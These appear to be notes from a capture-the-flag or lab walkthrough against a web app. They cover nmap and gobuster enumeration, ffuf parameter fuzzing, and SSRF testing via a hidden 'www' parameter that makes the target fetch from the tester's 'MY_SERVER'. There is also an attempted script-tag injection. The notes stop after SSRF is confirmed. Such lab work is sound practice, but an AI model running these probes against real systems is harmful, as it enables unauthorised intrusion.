
### Port scan

`sudo nmap --top-ports 1000 -oN nmap_initial.txt IP_ADDRESS`
Found ports:
```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Checked the web pages

- Found web app
- Performed mannual enumeration. Found `/contact` `/feedback` `/gallery` pages and `/upload` `/feedback` endpoints POST
- Used `gobuster` to find more directories and files `gobuster dir -u http://IP_ADDRESS:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt`
  - Found `/dejaview` which has a form that accepts image URL
  - Found the following call which routes to `/view_image` endpoint
  ```bash
  curl ^"http://10.66.131.250:8080/view_image^" ^
    -H ^"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8^" ^
    -H ^"Accept-Language: en-US,en;q=0.9^" ^
    -H ^"Cache-Control: max-age=0^" ^
    -H ^"Connection: keep-alive^" ^
    -H ^"Content-Type: application/x-www-form-urlencoded^" ^
    -H ^"Origin: http://10.66.131.250:8080^" ^
    -H ^"Referer: http://10.66.131.250:8080/view_image^" ^
    -H ^"Sec-GPC: 1^" ^
    -H ^"Upgrade-Insecure-Requests: 1^" ^
    -H ^"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36^" ^
    --data-raw ^"image_url=^%^2Fuploads^%^2F04.jpg^" ^
    --insecure
  ```
- Also,
```bash
curl 'http://10.66.131.250:8080/feedback' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://10.66.131.250:8080' \
  -H 'Referer: http://10.66.131.250:8080/contact' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  --data-raw 'name=aaaddd&email=fffggg&message=dddd+cccc' \
  --insecure
```
- Attempted SSRF on `/feedback` and `/view_image` by embedding `<script src='http://MY_SERVER/name.txt'></script>` => ❌
- Needed a hint here: attempted to fuzz the `/feedback` and `/view_image` endpoints with different params using `ffuf`:
  `ffuf -u http://IP_ADDRESS:8080/feedback -X POST -d "FUZZ=testing" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ffuf_feedback.txt`
  `ffuf -u http://IP_ADDRESS:8080/view_image -X POST -d "FUZZ=testing" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ffuf_view_image.txt`
  `ffuf -u http://IP_ADDRESS:8080/view_image -X POST -d "FUZZ=/uploads/04.jpg" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -o ffuf_view_image_2.txt`
  Found `www` param in `/view_image` endpoint
  - Tested SSRF again with `www` param: found a hit on my local server logs on req:
  ```bash
  curl -X POST http://IP_ADDRESS:8080/view_image \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-raw "www=http://MY_SERVER/name.txt"
  ```
- 